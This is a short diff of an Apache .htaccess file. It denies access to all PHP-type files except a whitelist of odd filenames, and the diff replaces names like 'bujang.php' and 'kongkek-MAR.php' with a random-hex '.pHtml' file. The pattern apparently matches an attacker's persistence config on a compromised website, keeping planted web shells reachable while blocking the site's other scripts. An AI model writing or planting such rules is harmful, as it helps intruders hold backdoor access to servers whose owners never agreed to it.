@@ -1,4 +1,4 @@
-Options -Indexes
+Deny from all
 <FilesMatch "(?i)\.(phtml|php|phar|pgif|pht|phtm|shtml|inc|php1|php2|php3|php4|php5|php56|php6|php7|php72|php8|php9|php[0-9]?|asp[x]?|)$">
 Order allow,deny
 Deny from all
@@ -8,7 +8,7 @@ Order allow,deny
 Allow from all
 </FilesMatch>
 
-<FilesMatch '^(696737db76a09.shtML|bujang.php|kongkek-MAR.php|kongkek-MAR.php82)$'>
+<FilesMatch '^(696fd53d4753a.pHtml)$'>
 Order allow,deny
 Allow from all
 </FilesMatch>
